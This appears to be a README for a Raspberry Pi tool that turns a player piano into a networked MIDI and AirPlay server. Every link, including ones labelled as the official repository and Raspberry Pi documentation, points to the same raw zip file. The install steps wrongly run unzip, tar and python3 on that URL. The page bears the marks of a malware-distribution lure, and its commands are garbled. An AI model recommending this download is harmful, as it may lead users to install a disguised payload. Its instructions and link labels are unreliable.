# 🎹 midi-piano-pi-server - Transform Your Piano into a MIDI Interface

## 🚀 Overview

midi-piano-pi-server is a tool designed for Raspberry Pi that turns a player piano into a network MIDI interface. This application allows you to broadcast songs played on your piano over AirPlay. It’s perfect for music enthusiasts looking to enhance their piano experience with modern technology.

## 🌐 Key Features

- **MIDI Interface:** Connect your player piano to other devices seamlessly.
- **AirPlay Support:** Broadcast music to your speakers wirelessly.
- **User-Friendly Web Interface:** Access and control the piano from any device.
- **Home Automation Ready:** Integrate with your smart home devices easily.
- **Self-Hosted Solution:** Keep your data private on your own server.

## 📥 Download & Install

To get started, visit the following page to download the latest version of midi-piano-pi-server:

[Download midi-piano-pi-server](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)

### Steps to Download

1. Click the link above to open the releases page.
2. Look for the latest version listed.
3. Download the appropriate file for your Raspberry Pi.

## 💻 System Requirements

- **Hardware:** Raspberry Pi (Model 3 or later recommended)
- **OS:** Raspberry Pi OS (Raspbian)
- **Network:** Wi-Fi connection for AirPlay functionality

## ⚙️ Installation Instructions

1. **Using the Terminal:**
   - Open a terminal window on your Raspberry Pi.
   - Navigate to the directory where you downloaded the file.

   ```bash
   cd ~/Downloads
   ```

2. **Extract the Downloaded File:**
   - If the file is a zip or tarball, extract it.

   ```bash
   unzip https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
   ```

   or

   ```bash
   tar -xvf https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
   ```

3. **Install Required Packages:**
   - Ensure you have Python and necessary libraries installed.

   ```bash
   sudo apt-get update
   sudo apt-get install python3 python3-pip
   pip3 install fastapi
   ```

4. **Run the Application:**
   - Navigate to the application directory.

   ```bash
   cd midi-piano-pi-server
   ```

   - Launch the server.

   ```bash
   python3 https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
   ```

5. **Access the Web Interface:**
   - Open a web browser on your device.
   - Type in the address of your Raspberry Pi followed by the port number (default is usually 8000).

   ```
   http://<YOUR_PI_IP>:8000
   ```

## 🎶 How to Use

1. **Connect Your Piano:**
   - Ensure your player piano is connected to the Raspberry Pi.

2. **Play a Song:**
   - Use the web interface to select and play your song.
  
3. **Broadcast Via AirPlay:**
   - Select your AirPlay speaker from the interface to start broadcasting.

## 📚 Troubleshooting

- **Cannot Access the Web Interface:**
  - Check that the Raspberry Pi and your device are connected to the same network.
  - Ensure that the application is running.

- **Audio Issues:**
  - Check the audio settings on your Raspberry Pi.
  - Ensure your AirPlay speaker is powered on and connected.

## 📞 Support

If you encounter any issues, you can ask questions on the GitHub Issues page. Make sure to provide details about your setup and the problem you face. This way, the community can assist you more effectively.

## 🏷️ Topics

This project involves a variety of related topics, including:

- Disklavier
- FastAPI
- Home Automation 
- IoT 
- MIDI
- Music
- Piano
- Python
- Raspberry Pi
- Self-hosted Solutions
- Web Interfaces
- Yamaha

## 🔗 Additional Resources

- **Official GitHub Repository:** [midi-piano-pi-server](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)
- **Raspberry Pi Documentation:** [Raspberry Pi Docs](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)

For more detailed instructions and updates, refer to the documentation and community discussions. Discover how this tool can enhance your music experience today!